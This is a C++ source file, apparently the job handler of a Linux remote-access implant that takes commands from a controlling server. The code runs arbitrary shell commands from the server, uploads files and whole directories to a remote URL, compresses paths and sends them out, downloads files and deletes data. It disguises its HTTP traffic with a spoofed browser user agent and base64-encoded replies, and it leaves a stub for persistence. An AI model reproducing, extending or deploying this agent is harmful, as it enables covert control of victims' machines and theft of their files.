// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 



#include "operations.h"
#include "json.h"
#include <iostream>
#include "utilities.h"
#include "base64.h"
#include <sstream>
#include <experimental/filesystem>
#include <fstream>
#include <unistd.h>
#include <errno.h>
#include <string.h>

namespace fs = std::experimental::filesystem;


bool isJobAvailable(const std::wstring &replyFromServer){
    
    std::wstring mode = json_ExtractValue(replyFromServer, L"mode");

    if((mode.empty() || mode==L"standard") ||
       (mode!=L"uploadFile"            &&
        mode!=L"UploadDir"             &&
        mode!=L"downloadFile"          &&
        mode!=L"downloadDir"           &&
        mode!=L"execute"               &&
        mode!=L"listDir"               &&
        mode!=L"copy"                  &&
        mode!=L"deleteFile"            &&
        mode!=L"compressAndDownload"   &&
        mode!=L"persist"               &&
        mode!=L"shell")){
    
        return false;
    }
      
   return true;
}


void startJob(){
          
    jobQueueMutex.lock();
    std::wstring job (jobQueue.front());
    jobQueue.pop();
    jobQueueMutex.unlock();
    std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?DataSignal\r\nAccept-Encoding: gzip, deflate, br\r\nUser-Agent: chromium/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/octet-stream\r\n";
    std::wstring dataToSend;
    std::wstring mode = json_ExtractValue(job, L"mode");
    std::error_code ec;
    std::wstring replyType {L"log"};


    if(mode == L"downloadFile"){            
        std::wstring url             = json_ExtractValue(job, L"url");
        std::wstring port            = json_ExtractValue(job, L"port");
        std::wstring filePath        = json_ExtractValue(job, L"filePath");
        std::wstring destPath        = json_ExtractValue(job, L"destPath");
        filePath = ReplaceTildeWithPath(filePath);
        destPath = ReplaceTildeWithPath(destPath);
        std::wstring fileName;

        if(fs::is_directory(destPath, ec)){
            if(hasWritePermissionForDirectory(destPath)){
                fileName = filePath.substr(filePath.find_last_of(L'/') + 1);        
                url += L":" + port + L"/" + filePath;
                if(DownloadFileFromURL(url, destPath)){
                    dataToSend = fileName + L" downloaded successfully";
                }
                else {
                    dataToSend = fileName + L" didn't downloaded";                
                }
            }
            else{                       // Destination directory doesn't have write permissions
                dataToSend = destPath + L" doesn't have write permissions";
            }            
        }
        else {
            dataToSend = destPath + L" doesn't exists";
        }
    }
    else if(mode == L"downloadDir"){
        std::wstring url             = json_ExtractValue(job, L"url");
        std::wstring port            = json_ExtractValue(job, L"port");
        std::wstring dirPath         = json_ExtractValue(job, L"dirPath");

        // Place your implementation here
    }
    else if(mode == L"uploadFile"){
        std::wstring url             = json_ExtractValue(job, L"url");
        std::wstring port            = json_ExtractValue(job, L"port");
        std::wstring filePath        = json_ExtractValue(job, L"filePath");
        filePath = ReplaceTildeWithPath(filePath);
        const std::wstring fileName = filePath.substr(filePath.find_last_of(L'/') + 1);
        if(fs::is_regular_file(filePath, ec)){ 
            url += L":" + port;          
            if(UploadFileToURL(url, filePath)){
                dataToSend = filePath + L" uploaded successfully";
            }
            else{
                dataToSend = filePath + L" didn't get uploaded";
            }
        }            
        else {
            dataToSend = filePath + L" doesn't exists";
        }
    }
    else if(mode == L"UploadDir"){
        std::wstring url             = json_ExtractValue(job, L"url");
        std::wstring port            = json_ExtractValue(job, L"port");
        std::wstring dirPath         = json_ExtractValue(job, L"dirPath");
        std::wstring fileExtensions  = json_ExtractValue(job, L"fileExtensions");
     
        dirPath = ReplaceTildeWithPath(dirPath);
        url += L":" + port; 
        
        if(fs::is_directory(dirPath, ec)){
            std::wstring errorMsg;            
            if(UploadDirectoryToURL(url, dirPath, errorMsg, fileExtensions)){
                dataToSend = dirPath + L"/ directory uploaded successfully";
            }
            else{
                dataToSend = dirPath + L"/ directory didn't get uploaded";
                dataToSend += L" | errorMsg: " + errorMsg;
            }                
        }
        else{
            dataToSend = dirPath + L" doesn't exist";
        }            
    }
    else if(mode == L"execute"){
        std::wstring shellType  = json_ExtractValue(job, L"shellType");
        std::wstring exePath    = json_ExtractValue(job, L"exePath");
        std::wstring arguments  = json_ExtractValue(job, L"exeArguments");
        
        if(shellType.empty()){
             shellType = L"/bin/sh";
        } 
        exePath     = ReplaceTildeWithPath(exePath);
        arguments   = ReplaceTildeWithPath(arguments);

        if (!fs::exists(exePath, ec)) {
            dataToSend = exePath + L" does not exist";
        }
        else if(isExecutable(exePath)){                                        
            dataToSend = executeCommand(shellType, exePath, arguments);
        }     
        else {dataToSend =  exePath + L" is not executable";}
    }
    else if(mode == L"deleteFile"){
        std::wstring filePath  = json_ExtractValue(job, L"filePath");
        if(filePath.empty()){ 
            dataToSend = L"Couldn't delete: filePath is empty!";
            
        }
        filePath = ReplaceTildeWithPath(filePath);
        if(fs::is_directory(filePath, ec)){
            dataToSend = L"Couldn't delete: " + filePath + L" is a directory!";
        }
        else {           
            if(fs::exists(filePath, ec)){
                if(fs::remove(filePath, ec)){
                    dataToSend = filePath + L" deleted successfully";
                }
                else{
                    dataToSend = L"Unable to deleted " + filePath + L" std::error_code = " + std::to_wstring(ec.value());
                }
            }
            else{
                dataToSend = filePath + L" does not exist!";
            }
        }
    }
    else if(mode == L"removeDir"){
        std::wstring dirPath  = json_ExtractValue(job, L"dirPath");             
        dirPath = ReplaceTildeWithPath(dirPath);

        if(fs::is_directory(dirPath, ec)){
            if(fs::remove_all(dirPath, ec)){
                dataToSend = dirPath + L" removed successfully";
            }
            else{
                dataToSend = L"Unable to remove " + dirPath + L" std::error_code = " + std::to_wstring(ec.value());
            }
        }
        else{
            dataToSend = dirPath + L" is not a directory";
        }       
    }
    else if(mode == L"listDir"){
        std::wstring dirInfo{L"{\"files\":["};
        std::wstring dirToList   = json_ExtractValue(job, L"dirToList");        
        if(dirToList.empty()){
            dirToList = L"/home/" + getUserName();   // Default is home directory, also try to find the home directory of user with another method if not found here
        }
        dirToList = ReplaceTildeWithPath(dirToList);
        if (!dirToList.empty() && dirToList.back() != L'/' && dirToList.back() != L'\\') {
            dirToList += L'/';
        }
        if(!fs::is_directory(dirToList, ec)){                 // Is this a Directory ?
            dataToSend = dirToList + L" is not a directory";          
        }
        else if(fs::is_empty(dirToList, ec)){                 // Is Directory Empty ?
                dataToSend =  dirToList + L" is empty!";               
        }
        else {                                               // This is NOT an EMPTY Directory, continue here
            std::vector<std::wstring> fileList_json;
            std::wstring drive {L""};                // Add a drive full path here i.e. /, C:/, D:/, F:/            
            auto it = fs::directory_iterator(dirToList, fs::directory_options::skip_permission_denied, ec);            
            for (auto i = fs::begin(it); i != fs::end(it); i.increment(ec)) {          
                auto entry = *i;                
                if(fs::is_symlink(entry, ec)){                    
                    continue;
                }
                fileList_json.push_back(L"name");
                std::wstring path {entry.path().wstring()};
                std::wstring filename{ extractFilename(path) };
                std::wstring sizeInBytes;

                if(fs::is_directory(path, ec)){
                    fileList_json.push_back(filename+L"/");
                    // size_t directorySize = calculateDirectorySize(path);          // THIS CONSUMES TOO MUCH TIME, NOT EFFICIENT !!!
                    // if (directorySize == static_cast<size_t>(-1)) { sizeInBytes = "N/A"; }                    
                    // else { sizeInBytes = std::to_string(directorySize); }
                    sizeInBytes = L"N/A";                    
                }
                else {
                    fileList_json.push_back(filename);
                    sizeInBytes = std::to_wstring (fs::file_size(path, ec));                    
                }                                        
                fileList_json.push_back(L"size");
                fileList_json.push_back(sizeInBytes);
                dirInfo.append(to_json(fileList_json));
                dirInfo.append(L",");
                fileList_json.clear(); 
            }
                dirInfo.pop_back();
                dirInfo.append(L"],\"dirToList\":[\"");
                dirInfo.append(dirToList);
                dirInfo.append(L"\"],");             
                dirInfo.append(L"\"drive\":[\"");
                dirInfo.append(drive);
                dirInfo.append(L"\"]}");                
                dataToSend =  dirInfo;
                replyType = L"dirList";                                                  
        }
    }
    else if(mode == L"copy"){
        const std::wstring sourcePath {json_ExtractValue(job, L"sourcePath")};
        const std::wstring destPath {json_ExtractValue(job, L"destPath")};

        if(sourcePath.empty() || destPath.empty()){ 
            dataToSend = L"Either source or destination is empty!";
        }
        else if(!fs::is_directory(destPath, ec)){           // Verify that the destination is a directory
            dataToSend = destPath + L" is not a directory!";
        }
        else {                                                  // Destination is a directory   
            if(fs::is_directory(sourcePath, ec)){           // Copy directory
                const std::wstring Dirname {ExtractLastDirectoryName(sourcePath)};   // Extract directory name from sourcePath
                if(fs::exists(destPath+L"/"+Dirname, ec)){    // if directory to be copied already exist at destination
                    dataToSend = sourcePath + L" already exist in the " + destPath;
                }
                else {
                    const auto copyOptions = fs::copy_options::skip_symlinks | fs::copy_options::recursive;                   
                    fs::copy(sourcePath, destPath+L"/"+Dirname, copyOptions, ec);
                    if(ec) { dataToSend = mode + L" " + s2ws(ec.message()); }
                    else {dataToSend = sourcePath + L" is copied to " + destPath + L" successfully"; } 
                }
            }
            else {                                          // Copy file
                const std::wstring filename {sourcePath.substr(sourcePath.find_last_of(L'/') + 1)};   // Extract file name from the sourcePath
                if(fs::exists(destPath + L"/" + filename, ec)){  // if file to be copied already exist at destination
                    dataToSend = destPath + L"/" + filename + L" already exist in the " + destPath;
                }
                else{
                    const auto copyOptions = fs::copy_options::skip_symlinks | fs::copy_options::skip_existing;                          
                    fs::copy_file(sourcePath, destPath + L"/" + filename, copyOptions, ec);
                    if(ec) { dataToSend = mode + L" " + s2ws(ec.message()); }
                    else {dataToSend = sourcePath + L" is copied to " + destPath + L" successfully"; } 
                }
            }               
        }
    }
    else if(mode == L"compressAndDownload"){
        std::wstring url         = json_ExtractValue(job, L"url");
        std::wstring port        = json_ExtractValue(job, L"port");
        std::wstring path        = json_ExtractValue(job, L"path");

        const std::wstring shellType {L"/bin/sh"};
        std::wstring archivePath = path;
        std::wstring filename = extractFilename(path);
        if((archivePath.back() == L'/') || (archivePath.back() == L'\\')){
            archivePath.pop_back();
        }
        const std::wstring compressionTool {L"tar"};
        std::wstring args {L"-czf " + std::wstring(L"\"") + archivePath + L".tar.gz\""};
        if(fs::is_directory(path)){
            // For directory --> tar -czf "archivePath.tar.gz" -C "path/to/dir" .
            args += std::wstring(L" -C ") + std::wstring(L"\"") + path + L"\" .";
        }
        else{
            // For file --> tar -czf "path/to/dir/file.tar.gz" -C "path/to/dir" "filename"                   
            args += std::wstring(L" -C \"") + archivePath.substr(0, archivePath.size()-filename.size()) + std::wstring(L"\" \"") + filename + L"\"";
        }
        const std::wstring output = executeCommand(shellType, compressionTool, args);     // Archive/Compress it
        archivePath.append(L".tar.gz");
        if(output.find(L"status: 0") != std::wstring::npos){
            url += L":" + port;            
            if(UploadFileToURL(url, archivePath)){ dataToSend = archivePath + L" uploaded successfully"; }                           
            else{ dataToSend = archivePath + L" didn't get uploaded"; }                            
        }
        else { 
            dataToSend = output;
        }
        if(!fs::remove(archivePath, ec)){
            dataToSend = archivePath + L" uploaded successfully but NOT deleted: " + s2ws(ec.message());
        }                               
    }
    else if (mode == L"shell") {

        std::wstring RecievedCommand{ json_ExtractValue(job, L"command") };
        RecievedCommand = ReplaceTildeWithPath(RecievedCommand);
        std::wstring cd{ json_ExtractValue(job, L"cd") };
        cd = ReplaceTildeWithPath(cd);
        static fs::path currentPath = fs::current_path();
        
        if (!(cd.empty())) {
            std::wstring newDir = changeDir(cd, ec);          
            if (newDir.empty()) {
                dataToSend = currentPath.wstring();
            }
            else {
                dataToSend = newDir;
                currentPath = newDir;           
            }            
        }
        else {
            if(!RecievedCommand.empty()){
            std::wstring command = L"/bin/sh -c \"cd " + currentPath.wstring() + L" && " + RecievedCommand + L"\"";
            std::wstring emptyString;
            dataToSend = executeCommand(L"/bin/sh", command, emptyString);
            }
        }
        replyType = L"shellResponse";
    }
    else if(mode == L"persist"){
        std::wstring method         = json_ExtractValue(job, L"method");  
        // Implement your persistance method(s) here
    }

    dataToSend = json_AppendKeyValue(jsonSysInfo, replyType, dataToSend);
    std::string dataToSendStr = ws2s(dataToSend); // Convert wstring to string   
    dataToSend = s2ws(base64_encode((unsigned char*)dataToSendStr.c_str(), dataToSendStr.length()));
    std::wstringstream contentLengthStream;
    contentLengthStream << dataToSend.length();
    request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
   
    request += L"Connection: close\r\n"; 
    request += L"\r\n" + dataToSend;
    
    responseQueueMutex.lock();
    responseQueue.push(request);
    responseQueueMutex.unlock();
}